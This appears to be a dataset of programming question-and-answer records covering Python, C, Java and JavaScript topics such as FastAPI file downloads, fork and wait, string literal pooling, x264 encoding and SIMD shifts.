                a.write(str(f)+"" ""+str(row_count) + os.linesep)

This works, it gives me a file with the filename and row counts. However, my problem here is this code for some reasons takes a very long time to run. I am not sure why. I assume, it is because it has to read in each csv? When I open the files in notepad this works quite fast and the number of rows is displayed without any delay. So I was not sure if my code is not good or if there is a faster implementation?
","It doesn't look like you're using the data for anything other than counting the rows. There's no need for a CSV reader for that.
Files are iterable by line so you can loop over it and count iterations. The writing out also has overhead so writing once will be faster.
row_counts = {}

for path, subdirs, files in os.walk(r'C:\Desktop\folder'):
    for filename in files:
        with open(os.path.join(path, filename), ""r"", encoding =""utf-8"") as f:
            rows = len(list(f))
            row_counts[filename] = rows

with open(""number of lines check.txt"", ""w"") as a:
    for f, count in row_counts.items():
        a.write(f""{f} {count}\n"")

If the files are very large, it would be better to iterate over them and maintain a count so that you don't need to read the whole file at once.
for filename in files:
    with open(os.path.join(path, filename), ""r"", encoding =""utf-8"") as f:
        rows = 0
        for _ in f: rows += 1
        row_counts[filename] = rows

",python
sorting columns in pandas dataframe based on column name,"I have a dataframe with over 200 columns. The issue is as they were generated the order is
['Q1.3','Q6.1','Q1.2','Q1.1',......]

I need to sort the columns as follows:
['Q1.1','Q1.2','Q1.3',.....'Q6.1',......]

Is there some way for me to do this within Python?
","df = df.reindex(sorted(df.columns), axis=1)

This assumes that sorting the column names will give the order you want.  If your column names won't sort lexicographically (e.g., if you want column Q10.3 to appear after Q9.1), you'll need to sort differently, but that has nothing to do with pandas.
",python
why is the top command output of memory different from the informations in the meminfo file,"So i am currently working on my own implementation of the top command using the ncurses and the Ubuntu proc folder system files and I am trying to display the memory informations on the fourth and fifith line of the top output.I have found the meminfo file in the /proc folder that contains the informations i am looking for.
However I have noticed that the informations in the file is slightly different from the one the top command show.I would like to understand if the meminfo file isn't the one i should be working with.
","TL;DR
Looks like top is getting the info from /proc/meminfo in ubuntu so items there should match with top (given a slight time offset)
================
It looks like the top command comes from the procps package.  I'm not sure if I have the source code of the most current (or even correct) top, but here's what I used: https://github.com/soarpenguin/procps-3.0.5/tree/e17c6e5fbedb7e8ff423586937aac42300ef11a6
Looking at the code, it appears that the top code uses the meminfo() function found in sysinfo.c.
Here's the code from top.c that seems to be building the memory lines...(from top.c)
static void frame_storage (void)
{
   meminfo();
   if (CHKw(Curwin, View_MEMORY)) {
      show_special(fmtmk(MEMORY_line1
         , kb_main_total, kb_main_used, kb_main_free, kb_main_buffers));
      show_special(fmtmk(MEMORY_line2
         , kb_swap_total, kb_swap_used, kb_swap_free, kb_main_cached));
      Msg_row += 2;
   }
}

Here's the code from sysinfo.c (in the same package but the /proc sub-dir) that is used to carry the info:
#define MEMINFO_FILE ""/proc/meminfo""

... defining where it gets the info.  And the follow can be found starting at line 286 of sysinfo.c.  There's the mem_table_struct and the associated strings that its using to fill the structure from /proc/meminfo:
void meminfo(void){
  char namebuf[16]; /* big enough to hold any row name */
  mem_table_struct findme = { namebuf, NULL};
  mem_table_struct *found;
  char *head;
  char *tail;
  static const mem_table_struct mem_table[] = {
  {""Active"",       &kb_active},
  {""Buffers"",      &kb_main_buffers},
  {""Cached"",       &kb_main_cached},
  {""Committed_AS"", &kb_committed_as},
  {""Dirty"",        &kb_dirty},
  {""HighFree"",     &kb_high_free},
  {""HighTotal"",    &kb_high_total},
  {""Inact_clean"",  &kb_inact_clean},
  {""Inact_dirty"",  &kb_inact_dirty},
  {""Inact_target"", &kb_inact_target},
  {""Inactive"",     &kb_inactive},
  {""LowFree"",      &kb_low_free},
  {""LowTotal"",     &kb_low_total},
  {""Mapped"",       &kb_mapped},
  {""MemFree"",      &kb_main_free},
  {""MemShared"",    &kb_main_shared},
  {""MemTotal"",     &kb_main_total},
  {""PageTables"",   &kb_pagetables},
  {""ReverseMaps"",  &nr_reversemaps},
  {""Slab"",         &kb_slab},
  {""SwapCached"",   &kb_swap_cached},
  {""SwapFree"",     &kb_swap_free},
  {""SwapTotal"",    &kb_swap_total},
  {""Writeback"",    &kb_writeback}
  };

So, yeah, /proc/meminfo carries the memory at a given time.  Top.c uses it to display.  Perhaps you're not using the right field or there's a time diffential but the code seems to be using /proc/meminfo.
",c
what is the from uri when you are defining the camel route in xml,"I have several services that I would like to add Camel routes.  The examples in xml I see are like so:
<route id=""myId""
from uri=""direct:inside""/>
to uri=""mock:inside""/>
</route>

Where can I find the acceptable values for the string after ""from uri=""?
Also if I'm in ServiceA that seems like what I should put in the from uri.  How do I do that? 
","All the Camel components have documentation which options they support. For example the direct component, has only 1 option listed
https://camel.apache.org/components/4.8.x/direct-component.html
You can see a list of all the components here:
http://camel.apache.org/components
",java
how to download a file after posting data using fastapi,"I am creating a web application that receives some text, converts the text into  speech, and returns an mp3 file, which is saved to a temporary directory.
I want to be able to download the file from the html page (i.e., the frontend), but I don't know how to do that properly.
I know with Flask you can do this:
from app import app
from flask import Flask, send_file, render_template
    
@app.route('/')
def upload_form():
    return render_template('download.html')

@app.route('/download')
def download_file():
    path = ""html2pdf.pdf""

    return send_file(path, as_attachment=True)

if __name__ == ""__main__"":
    app.run()

HTML Example:
<!doctype html>
<title>Python Flask File Download Example</title>
<h2>Download a file</h2>
<p><a href=""{{ url_for('.download_file') }}"">Download</a></p>

So how do I replicate this with FastAPI?
FastAPI Code:
from fastapi import FastAPI, File, Request, Response, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, StreamingResponse
from fastapi.templating import Jinja2Templates
from gtts import gTTS

templates = Jinja2Templates(directory=""templates"")


def text_to_speech(language:str, text: str) -> str:
    tts = gTTS(text=text, lang=language, slow=False)
    tts.save(""./temp/welcome.mp3"")
    #os.system(""mpg321 /temp/welcome.mp3"")
    return ""Text to speech conversion successful""


@app.get(""/"")
def home(request: Request):
    return templates.TemplateResponse(""index.html"", {""request"": request})

@app.get(""/text2speech"")
async def home(request: Request):
    if request.method == ""POST"":
        form = await request.form()
        if form[""message""] and form[""language""]:
            language = form[""language""]
            text = form[""message""]
            translate = text_to_speech(language, text)
            path = './temp/welcome.mp3'
            value = FileResponse(""./temp/welcome.mp3"", media_type=""audio/mp3"")
            return value
    # return templates.TemplateResponse(
    #     ""index.html"",
    #     {""request"": request, ""message"": text, ""language"": language, ""download"": value},
    # )


Sample HTML File:
<!doctype html>
<title>Download MP3 File</title>
<h2>Download a file</h2>
<p><a href=""{{ url_for('text2speech') }}"">Download</a></p>

","Use the Form keyword to define Form-data in your endpoint, and more specifically, use Form(...) to make a parameter required, instead of using await request.form() and manually checking if the user submitted the required parameters. After processing the received data and generating the audio file, you can use FileResponse to return the file to the user. Note: use the headers argument in FileResponse to set the Content-Disposition header using the attachment parameter—as described in this answer—to have the file downloaded to your device. Failing to set the headers, or using the inline parameter isntead, would lead to 405 Method Not Allowed error, as, in that case, the browser would attempt accessing the file using a GET request, in order to display the file contents inline (however, only POST requests are allowed to your /text2speech endpoint). Have a look at Option 1 in the examples below.
If you wanted the /text2speech endpoint supporting both GET and POST requests (as shown in your question), you could either (1) use @app.api_route(""/text2speech"", methods=[""GET"", ""POST""]) and use request.method to check whether it is a GET or POST request (see this answer for a working example), or (2) define two different endpoints with the following decorators on each one, i.e., @app.post('/text2speech') and @app.get('/text2speech') (Side note: These decorators could also be used on the same endpoint/function, and then use request.method as described in (1) option). However, you don't necessarily need to do that in this case.
Additionally, you have added a Download hyperlink to your template for the user to download the file. However, you haven't provided any information as to how you expect this to work. This wouldn't work in a scenario where you don't have static files, but dynamically generated audio files (as in your case), as well as multiple users accessing the API at the same time; unless, for example, you generated random UUIDs for the filenames and saved the files to a StaticFiles directory—or added that unique identifier as a query/path parameter (you could also use cookies instead, see here and here) to the URL in order to identify the file to be downloaded—and sent the URL back to the user. In that case, you would need a Javascript interface/library, such as Fetch API, to make an asynchronous HTTP request—as described in this answer—in order to get the URL to the file and display it in the Download hyperlink. Have a look at Option 2 below. Note: The example in Option 2, for demo purposes, uses a simple dict to map the filepaths to UUIDs. In a real-world scenario, however, where multiple users access the API and several workers might be used, you may consider using a database storage, or Key-Value stores (Caches), as described here and here. You would also need to have a mechanism for deleting the files from the database and disk, once they have been downloaded, as well as make sure that users do not have unauthorized access to other users' audio files. It is also worth mentioning that in the same example, the UUID is expected as a query parameter to the /download endpoint, but in a real-world scenario, you should never pass sensitive information to the query string, as this would pose security/privacy risks (more details on that are given in Solution 1 of this answer). Instead, you should pass sensitive data to the request body (similar to Solution 2 of this answer), and always use the HTTPS protocol.
Option 1
app.py
from fastapi import FastAPI, Request, Form
from fastapi.templating import Jinja2Templates
from fastapi.responses import FileResponse
import os

app = FastAPI()
templates = Jinja2Templates(directory=""templates"")


@app.get('/')
async def main(request: Request):
    return templates.TemplateResponse(""index.html"", {""request"": request})


@app.post('/text2speech')
def convert(request: Request, message: str = Form(...), language: str = Form(...)):
    # do some processing here
    filepath = './temp/welcome.mp3'
    filename = os.path.basename(filepath)
    headers = {'Content-Disposition': f'attachment; filename=""{filename}""'}
    return FileResponse(filepath, headers=headers, media_type=""audio/mp3"")

An alternative to the above would be to read the file data inside your endpoint—or, in case the data were fully loaded into memory beforehand, such as here, here and here—and return a custom Response directly, as shown below:
from fastapi import Response

@app.post('/text2speech')
   ...
    with open(filepath, ""rb"") as f:
        contents = f.read()  # file contents could be already fully loaded into RAM
    
    headers = {'Content-Disposition': f'attachment; filename=""{filename}""'}
    return Response(contents, headers=headers, media_type='audio/mp3')

In case you had to return a file that is too large to fit into memory—e.g., if you have 8GB of RAM, you can’t load a 50GB file—you could use StreamingResponse, which would load the file into memory in chunks and process the data one chunk at a time. If you find yield from f, shown in the example below, being rather slow, please have a look at this answer for faster alternatives. It should also be noted that using FileResponse would also load the file contents into memory in chunks (instead of the entire contents at once); however, the chunk size in that case would be 64KB, as specified in the implementation class of FileResponse. Thus, if that chunk size does not suit your requirements, you could instead use a StreamingResponse, as demonstrated below, or as shown in this this answer, by specifying the chunk size as desired.
from fastapi.responses import StreamingResponse

@app.post('/text2speech')
    ...
    def iterfile():
        with open(filepath, ""rb"") as f:
            yield from f

    headers = {'Content-Disposition': f'attachment; filename=""{filename}""'}
    return StreamingResponse(iterfile(), headers=headers, media_type=""audio/mp3"")

templates/index.html
<!DOCTYPE html>
<html>
   <head>
      <title>Convert Text to Speech</title>
   </head>
   <body>
      <form method=""post"" action=""http://127.0.0.1:8000/text2speech"">
         message : <input type=""text"" name=""message"" value=""This is a sample message""><br>
         language : <input type=""text"" name=""language"" value=""en""><br>
         <input type=""submit"" value=""submit"">
      </form>
   </body>
</html>

Using JavaScript to download the file
In case you used a JavaScript interface, such as Fetch API, in the frontend to issue the file-download request—instead of using an HTML <form>, as demonstrated above—please have  a look at this answer, as well as this answer and this answer on how to download the file in the frontend through JavaScript.
Option 2
app.py
from fastapi import FastAPI, Request, Form
from fastapi.templating import Jinja2Templates
from fastapi.responses import FileResponse
import uuid
import os

app = FastAPI()
templates = Jinja2Templates(directory=""templates"")
files = {}


@app.get('/')
async def main(request: Request):
    return templates.TemplateResponse(""index.html"", {""request"": request})


@app.get('/download')
def download_file(request: Request, fileId: str):
    filepath = files.get(fileId)
    if filepath:
        filename = os.path.basename(filepath)
        headers = {'Content-Disposition': f'attachment; filename=""{filename}""'}
        return FileResponse(filepath, headers=headers, media_type='audio/mp3')    


@app.post('/text2speech')
def convert(request: Request, message: str = Form(...), language: str = Form(...)):
    # do some processing here
    filepath = './temp/welcome.mp3'
    file_id = str(uuid.uuid4())
    files[file_id] = filepath
    file_url = f'/download?fileId={file_id}'
    return {""fileURL"": file_url}

templates/index.html
<!DOCTYPE html>
<html>
   <head>
      <title>Convert Text to Speech</title>
   </head>
   <body>
      <form method=""post"" id=""myForm"">
         message : <input type=""text"" name=""message"" value=""This is a sample message""><br>
         language : <input type=""text"" name=""language"" value=""en""><br>
         <input type=""button"" value=""Submit"" onclick=""submitForm()"">
      </form>

      <a id=""downloadLink"" href=""""></a>

      <script type=""text/javascript"">
         function submitForm() {
             var formElement = document.getElementById('myForm');
             var data = new FormData(formElement);
             fetch('/text2speech', {
                   method: 'POST',
                   body: data,
                 })
                 .then(response => response.json())
                 .then(data => {
                   document.getElementById(""downloadLink"").href = data.fileURL;
                   document.getElementById(""downloadLink"").innerHTML = ""Download"";
                 })
                 .catch(error => {
                   console.error(error);
                 });
         }
      </script>
   </body>
</html>

Removing a File after it's been downloaded
For Option 1 above, to remove a file after it has been downloaded by the user, you can simply define a BackgroundTask to be run after returning the response. For example:
from fastapi import BackgroundTasks
import os

@app.post('/text2speech')
def convert(request: Request, background_tasks: BackgroundTasks, ...):
    filepath = 'welcome.mp3'
    # ...
    background_tasks.add_task(os.remove, path=filepath)
    return FileResponse(filepath, headers=headers, media_type=""audio/mp3"")

For Option 2, however, you would have to make sure to delete the key (i.e., file_id) pointing to the given filepath from the cache as well. Hence, you should create a background task function, as shown below:
from fastapi import BackgroundTasks
import os

files = {}


def remove_file(filepath, fileId):
    os.remove(filepath)
    del files[fileId]


@app.get('/download')
def download_file(request: Request, fileId: str, background_tasks: BackgroundTasks):
    filepath = files.get(fileId)
    if filepath:
        # ...
        background_tasks.add_task(remove_file, filepath=filepath, fileId=fileId)
        return FileResponse(filepath, headers=headers, media_type='audio/mp3')    

More details and examples on background tasks can be found here, as well as here.
",python
gradle build fails with quotunsupported class file major version 65quot after updating to java 17,"I’m working on a Flutter project and recently updated to Java 17. Since the update, my build fails with the following error when trying to run assembleDebug:
FAILURE: Build failed with an exception.

What went wrong:
Could not open cp_settings generic class cache for settings file '.../android/settings.gradle'.


BUG! exception in phase 'semantic analysis' in source unit 'BuildScript' Unsupported class file major version 65

It seems to be related to Gradle and Java compatibility. I’ve already tried updating the gradle-wrapper.properties to a Gradle version that supports Java 17, but the error persists. Here's what I’ve done so far:
Updated gradle-wrapper.properties to use Gradle version 7.3.3:
distributionUrl=https://services.gradle.org/distributions/gradle-7.3.3-bin.zip
Ensured Java 17 is installed and set as the default JAVA_HOME on my system.
Flutter doctor output confirms that Flutter is using Java 17.
Despite these steps, the build continues to fail. Here's the full error output:

BUG! exception in phase 'semantic analysis' in source unit 'BuildScript' Unsupported class file major version 65

Steps I’ve Tried:
Updating Gradle to 7.3.3 in gradle-wrapper.properties.
Running flutter clean and rebuilding the project.
Ensuring JAVA_HOME is pointing to the correct Java 17 installation.
Environment:
Flutter version: (specific version)
Java version: 17
Gradle version: 7.3.3 (set in gradle-wrapper.properties)
This is my build.gradle code
compileOptions {
    sourceCompatibility JavaVersion.VERSION_17
    targetCompatibility JavaVersion.VERSION_17
}

kotlinOptions {
    jvmTarget = '17'
}    

P.S. All of this started when i updated Android Studio to the Ladybug version
","I found the solution to the problem, I followed @Robert advice. All I needed to do was to configure flutter to use my old java 17 directory
flutter config --jdk-dir <path-to-java-sdk-17-home-directory>

after I did that command everything worked.
",java
preferred block size for efficient file io,"Is the value of st_blksize field of struct stat type filled inside function stat()'s output parameter, hard coded in some system config file? If it is, can somebody tell me the system config file path?
","Converting my comments into an answer.
The preferred block size may vary by file system type, so there's no easy way to determine one size at compile time for all files on a system — let alone if the executable will be copied across systems.

Can you get that information non-programmatically?

No — certainly not portably between Linux and non-Linux systems. There's the POSIX statvfs() function, but it provides minimal reliable information. The various stat() functions may provide more information, but that's all programmatic because the answer depends on which file system a given file resides on. You can't rely on a value derived at compile time.
",c
quottypeerror responsejson is not a functionquot when trying to parse json,"I am getting an error I do not understand. I'm fetching an API url in json format, followed by a json to JS object parsing, using json()
const response = fetch('https://power.larc.nasa.gov/api/temporal/monthly/point?parameters=ALLSKY_SFC_SW_DNI&community=RE&longitude=48.0000&latitude=27.0000&format=JSON&start=2001&end=2020');

const data = response.json();

Can someone please explain this error..
","fetch is an asynchronous function; it doesn't return the response right away (you get a Promise instead).
If you want to fetch the data, you need to use the await (if the fetch is called inside another async function), or provide a callback via then method in the Promise from the fetch call:
fetch('https://power.larc.nasa.gov/api/temporal/monthly/point?parameters=ALLSKY_SFC_SW_DNI&community=RE&longitude=48.0000&latitude=27.0000&format=JSON&start=2001&end=2020')
.then(response => {
   const data = response.json();
});

Working with data from response
If you would do something like this, it won't work:
let data;

fetch('https://power.larc.nasa.gov/api/temporal/monthly/point?parameters=ALLSKY_SFC_SW_DNI&community=RE&longitude=48.0000&latitude=27.0000&format=JSON&start=2001&end=2020')
.then(response => {
   data = response.json();
});

console.log(data);

The reason is because the callback inside the then method is executed after the response has been returned (this might take seconds for example), but the console.log(data) is executed immediately after the fetch is called. This means that the data isn't assigned yet and will be probably undefined. For this reason, if you want to put data somewhere, you need to put your code inside the callback.
function processData(responseData) {
    // Here, you can put your code to process the data from response
    console.log(responseData);
}

fetch('https://power.larc.nasa.gov/api/temporal/monthly/point?parameters=ALLSKY_SFC_SW_DNI&community=RE&longitude=48.0000&latitude=27.0000&format=JSON&start=2001&end=2020')
.then(response => {
    const data = response.json();

    processData(data);
});

This way the data will be processed after it is fetched.
",javascript
in c what are the rules governing how compilers merge the same strings into the executable,"I am trying to find what the rules are for c and c++ compilers putting strings into the data section of executables and don't know where to look. I would like to know if the address of all of the following are guaranteed to be the same in c/c++ by the spec:
char * test1 = ""hello"";
const char * test2 = ""hello"";
static char * test3 = ""hello"";
static const char * test4 = ""hello"";
extern const char * test5; // Defined in another compilation unit as ""hello""
extern const char * test6; // Defined in another shared object as ""hello""

Testing on windows, they are all the same. However I do not know if they would be on all operating systems.
","I would like to know if the address of all of the following are guaranteed to be the same in c/c++ by the spec
String literals are allowed to be the same object but are not required to.
C++ says:

(C++11, 2.14.5p12) ""Whether all string literals are distinct (that is, are stored in nonoverlapping objects) is implementation-defined. The effect of attempting to modify a string literal is undefined.""

C says:

(C11, 6.5.2.5p7) ""String literals, and compound literals with const-qualified types, need not designate distinct objects.101) This allows implementations to share storage for string literals and constant compound literals with the same or overlapping representations.""

And C99 Rationale says:

""This specification allows implementations to share copies of strings with identical text, to place string literals in read-only memory, and to perform certain optimizations""

",c
size_t is pointer size in practice,"Let me first clarify that I am by now very familiar with definitions of size_t and intptr_t, and I don't want any repetitions of what they accomplish.
Instead I would like to know the following. Do you know of any platform, except x86/DOS (with its unbearable memory models) where the cast
void* a = ...;
size_t b = (size_t)a;

actually loses bits or bytes?
","AFAIK, on AS/400 pointers are 128-bit, but size_t is defined to be 32-bit.
",c
python translator translating to jul as opposed to july,"I'm working with this module right here:
https://pypi.org/project/translate
I am translating all the months in a year to english, but I'm noticing that the 7th month is translated to it's short form ""Jul"" as opposed to ""July"".
Here is what I'm doing:
main.py
from translate import Translator

translator=Translator(from_lang=""Norwegian"", to_lang=""English"")

print(translator.translate(""Juli""))


Terminal
> pip install translator
> python main.py
Jul
>

""Juli"" in norwegian should be ""July"" in english, not sure why it comes out as ""Jul"".
The other months are translated just fine.
I'm using Docker to run my application in the official Python 3.5 image.
I tried listing all the month names in a Python list, where all the other names were translated correctly.
main.py
# All the month names in norwegian.
months = [ ""Januar"", ""Februar"", ""Mars"", ""April"", ""Mai"", ""Juni"", ""Juli"", ""August"", ""September"", ""Oktober"", ""November"", ""Desember"" ]

for month in months:
    print(translator.translate(month))

Terminal
> pip install translator
> python main.py
January
February
March
April
May
June
Jul
August
September
October
November
December
>

I really, really hope I can find a solution that isn't this:
if month == ""Jul"":
    print(""July"")

","As stated in the Documentation the translator used by this library can be changed by using a parameter. If the default translator yields undesirable results I would advise to check out one of the other available Translators. Here is an example how to change the provider to deepl. Microsoft Translation API, Translated MyMemory API and LibreTranslate are also available.
from translate import Translator

translator=Translator(from_lang=""Norwegian"", to_lang=""English"",provider='deepl')

",python
bulk creation of telegram channels via scriptautomation,"I’ve been researching for a few days but can’t find guidance on a way to create multiple telegram channels at once or via automation(Shell script, python, Java etc etc)
The intent is to create multiple channels by specifying name, description & users to be added to it.
Could someone please help
","TELEGRAM_USER = <Your telegram username - @my_name>
TELEGRAM_APP_API_ID = <Get the API ID from https://my.telegram.org/apps - App api_id:>
TELEGRAM_APP_API_HASH = <Get the API HASH from https://my.telegram.org/apps - App api_hash:>


def create_channel_with_users(chname, descrip):
    with TelegramClient(TELEGRAM_USER, TELEGRAMA_APP_API_ID, TELEGRAMA_APP_API_HASH) as client:
        result = client(functions.channels.CreateChannelRequest(
            title=chname,
            about=descrip,
            megagroup=True
        ))
        return result

",python
wait for child process without using wait,"When using fork(), is it possible to ensure that the child process executes before the parent without using wait() in the parent?

This is related to a homework problem in the Process API chapter of Operating Systems: Three Easy Pieces, a free online operating systems book.
The problem says:


Write another program using fork(). The child process should
  print ""hello""; the parent process should print ""goodbye"". You should
  try to ensure that the child process always prints first; can you do
  this without calling wait() in the parent?


Here's my solution using wait():
#include <stdio.h>
#include <stdlib.h> // exit
#include <sys/wait.h> // wait
#include <unistd.h> // fork

int main(void) {
    int f = fork();
    if (f < 0) { // fork failed
        fprintf(stderr, ""fork failed\n"");
        exit(1);
    } else if (f == 0) { // child
        printf(""hello\n"");
    } else { // parent
        wait(NULL);
        printf(""goodbye\n"");
    }
}

After thinking about it, I decided the answer to the last question was ""no, you can't"", but then a later question seems to imply that you can:


Now write a program that uses wait() to wait for the child process
  to finish in the parent. What does wait() return? What happens if
  you use wait() in the child?


Am I interpreting the second question wrong? If not, how do you do what the first question asks? How can I make the child print first without using wait() in the parent?
","Create a pipe in the parent. After fork, close the write half in the parent and the read half in the child.
Then, poll for readability. Since the child never writes to it, it will wait until the child (and all grandchildren, unless you take special care) no longer exists, at which time poll will give a ""read with hangup"" response. (Alternatively, you could actually communicate over the pipe).
You should read about O_CLOEXEC. As a general rule, that flag should always be set unless you have a good reason to clear it.
",c
inserting newlines in xml file generated via xmletreeelementtree in python,"I have created a xml file using xml.etree.ElementTree in python. I then use
tree.write(filename, ""UTF-8"") 

to write out the document to a file.
But when I open filename using a text editor, there are no newlines between the tags. Everything is one big line
How can I write out the document in a ""pretty printed"" format so that there are new lines (and hopefully indentations etc) between all the xml tags?
","The easiest solution I think is switching to the lxml library. In most circumstances you can just change your import from import xml.etree.ElementTree as etree to from lxml import etree or similar.
You can then use the pretty_print option when serializing:
tree.write(filename, pretty_print=True)

(also available on etree.tostring)
",python
jersey message body reader not found in mavenbuilt jar,"My application uses a REST (JAX-RS Jersey) interface. When I run it in Eclipse, everything'
s fine. The domain objects are annotated, I'm not using XML files for the REST mapping.
Now I created a standalone JAR using the maven-assembly-plugin, which packs the application and all dependencies in a single, executable JAR file. This also seems to work. 
But when I start the application and request an object from the server, Jersey complains, that it can't find a message body reader:
com.sun.jersey.api.client.ClientHandlerException: A message body reader for Java type, class de.rybu.atuin.core.entity.User, and MIME media type, application/json, was not found

Any ideas why this happens?
EDIT: After I slept a night over it, I noticed that it complains about JSON... but I'm using only XML for serialization. Strange.
","I fixed the problem and I guess I know how :-)
My resources were annotated like this:
@Produces( { MediaType.APPLICATION_XML, MediaType.APPLICATION_JSON })
@Path(CONTEXT_ADDRESS)
public class UserResource
{
}

My client used the reverse order:
WebResource wr = ...
User user = wr.accept(MediaType.APPLICATION_JSON_TYPE, MediaType.APPLICATION_XML_TYPE).get(new GenericType<User>(){});

I don't know what initially caused the problem but I completely removed JSON-support and now it works. Maybe it would have been sufficient to simply swith the order of JSON and XML in the client but I didn't try that.
",java
in python how can i export a 3d isosurface into blender,"I have some 3D (x,y,z,value) data in python and I can visualize the isosurfaces in Mayavi. How can I export this isosurface into a file that I can read into Blender?
Here is some example code:
import numpy
from mayavi import mlab

x, y, z = numpy.ogrid[-5:5:64j, -5:5:64j, -5:5:64j]
values = x * x * 0.5 + y * y + z * z * 2.0
mlab.contour3d(values, contours=[.5])
mlab.show()

","Using @timday's suggestion, I added the following code to save the isosurface in a wavefront (.obj) format:
mlab.savefig('surface.obj')
Then, I can open it in Blender with File>>Import>>Wavefront (.obj)
I had to scale down the image considerably (~100x) to make it visible in the Blender viewport.

The origin is set way off to the side of the actual object, so the object is easier to deal with if I use Object>>Transform>>Origin to Geometry

After adding some lighting and a plane, the object looks pretty good!

",python
raw types and subtyping,"We have generic class
SomeClass<T>{ }

We can write the line:
SomeClass s= new SomeClass<String>();

It's ok, because raw type is supertype for generic type. But
SomeClass<String> s= new SomeClass();

is correct to. Why is it correct? I thought that type erasure was before type checking, but it's wrong.
From Hacker's Guide to Javac

When the Java compiler is invoked with default compile policy it performs the following passes:

parse: Reads a set of *.java source files and maps the resulting token
sequence into AST-Nodes.
enter: Enters symbols for the definitions into the symbol table.
process annotations: If Requested, processes annotations found in
the specified compilation units.
attribute: Attributes the Syntax trees. This step includes name
resolution, type checking and constant folding.
flow: Performs data ow analysis on the trees from the previous step.
This includes checks for assignments and reachability.
desugar: Rewrites the AST and translates away some syntactic sugar.
generate: Generates Source Files or Class Files.


Generic is syntax sugar, hence type erasure invoked at 6 pass, after type checking, which invoked at 4 pass. I'm confused.
","The type parameter definitely participate in type checking; otherwise it will be pointless (i.e. no better than raw types).
The information is also needed to generate implicit casts so it will survive to your step 7 and technically to runtime as debug symbols. However, only the erasure will participate in runtime type cast checking (for obvious backwards compatibility reasons). Nonetheless, if your generic code can be fully statically checked, it can be as strong as generic programs in non-type-erasure languages.
When you assign SomeClass to SomeClass<String>, the compiler will give you a warning about raw type use. At this point, your program is obviously no longer safe.
",java
jupyter server  not started no kernel in vs code,"i am trying to use jupyter notebooks from vs code and installed jupyter notebook extension and i am using (base)conda environment for execution.
while this happened
Error: Jupyter cannot be started. Error attempting to locate jupyter:
at A.startServer (c:\Users\DELL\.vscode\extensions\ms-python.python-2020.2.63990\out\client\extension.js:1:784356)
at async A.ensureServerAndNotebookImpl (c:\Users\DELL\.vscode\extensions\ms-python.python-2020.2.63990\out\client\extension.js:1:783811)
at async A.ensureServerAndNotebook (c:\Users\DELL\.vscode\extensions\ms-python.python-2020.2.63990\out\client\extension.js:1:783612)
at async A.submitCode (c:\Users\DELL\.vscode\extensions\ms-python.python-2020.2.63990\out\client\extension.js:1:780564)
at async A.reexecuteCell (c:\Users\DELL\.vscode\extensions\ms-python.python-2020.2.63990\out\client\extension.js:75:879318)


how to resolve this issue ?
","I had exactly the same problem when I installed Visual Studio Code and tried to run some Python code from a jupyter notebook on my fresh Ubuntu 18.04.
How I solved it:

Make sure you have installed the Jupyter Extension in VS Code. (for those who don't read the SO question :))

Press Command+Shift+P to open a new command pallete

Type >Python: Select Intepreter to start jupyter notebook server

Open the notebook again


And it worked fine. Hope it works for you.
",python
encode x264libx264 raw yuv frame data,"I am trying to encode an MP4 video using raw YUV frames data, but I am not sure how can I fill the plane data (preferably without using other libraries like ffmpeg)
The frame data is already encoded in I420, and does not need conversion.
Here is what I am trying to do:
const char *frameData = /* Raw frame data */;

x264_t *encoder = x264_encoder_open(&param);
x264_picture_t imgInput, imgOutput;
x264_picture_alloc(&imgInput, X264_CSP_I420, width, height);

// how can I fill the struct data of imgInput

x264_nal_t *nals;
int i_nals;
int frameSize = x264_encoder_encode(encoder, &nals, &i_nals, &imgInput, &imgOutput);

The equivalent command line that I have found is : 
 x264 --output video.mp4 --fps 15 --input-res 1280x800 imgdata_01.raw 

But I could not figure out how the app does it.
Thanks.
","Look at libx264 API usage example. This example use fread() to fill frame allocated by x264_picture_alloc() with actual i420 data from stdin. If you already have i420 data in memory and want to skip memcpy step than instead of it you can:

Use x264_picture_init() instead of x264_picture_alloc() and x264_picture_clean(). Because you don't need allocate memory on heap for frame data.
Fill x264_picture_t.img struct fields:


i_csp = X264_CSP_I420;
i_plane = 3;
plane[0] = pointer to Y-plane;
i_stride[0] = stride in bytes for Y-plane;
plane[1] = pointer to U-plane;
i_stride[1] = stride in bytes for U-plane;
plane[2] = pointer to V-plane;
i_stride[2] = stride in bytes for V-plane;

",c
simd versions of shldshrd instructions,"SHLD/SHRD instructions are assembly instructions to implement multiprecisions shifts.
Consider the following problem:
uint64_t array[4] = {/*something*/};
left_shift(array, 172);
right_shift(array, 172);

What is the most efficient way to implement left_shift and right_shift, two functions that operates a shift on an array of four 64-bit unsigned integer as if it was a big 256 bits unsigned integer?
Is the most efficient way of doing that is by using SHLD/SHRD instructions, or is there better (like SIMD versions) instructions on modern architecture?
","In this answer I'm only going to talk about x64.
x86 has been outdated for 15 years now if you're coding in 2016 it hardly makes sense to be stuck in 2000.
All times are according to Agner Fog's instruction tables.
Intel Skylake  example timings*
The shld/shrd instructions are rather slow on x64.
Even on Intel skylake they have a latency of 4 cycles and uses 4 uops meaning it uses up a lot of execution units, on older processors they're even slower.
I'm going to assume you want to shift by a variable amount, which means a
SHLD RAX,RDX,cl        4 uops, 4 cycle latency.  -> 1/16 per bit

Using 2 shifts + add you can do this faster slower.
@Init:
MOV R15,-1
SHR R15,cl    //mask for later use.    
@Work:
SHL RAX,cl        3 uops, 2 cycle latency
ROL RDX,cl        3 uops, 2 cycle latency
AND RDX,R15       1 uops, 0.25 latency
OR RAX,RDX        1 uops, 0.25 latency    
//Still needs unrolling to achieve least amount of slowness.

Note that this only shifts 64 bits because RDX is not affected.
So you're trying to beat 4 cycles per 64 bits.
//4*64 bits parallel shift.  
//Shifts in zeros.
VPSLLVQ YMM2, YMM2, YMM3    1uop, 0.5 cycle latency.  

However if you want it to do exactly what SHLD does you'll need to use an extra VPSLRVQ and an OR to combine the two results.
VPSLLVQ YMM1, YMM2, YMM3    1uop, 0.5 cycle latency.  
VPSRLVQ YMM5, YMM2, YMM4    1uop, 0.5 cycle latency.   
VPOR    YMM1, YMM1, YMM5    1uop, 0.33 cycle latency.   

You'll need to interleave 4 sets of these costing you (3*4)+2=14 YMM registers.
Doing so I doubt you'll profit from the low .33 latency of VPOR so I'll assume a 0.5 latency instead.
That makes 3uops, 1.5 cycle latency for 256 bits = 1/171 per bit = 0.37 cycle per QWord = 10x faster, not bad.
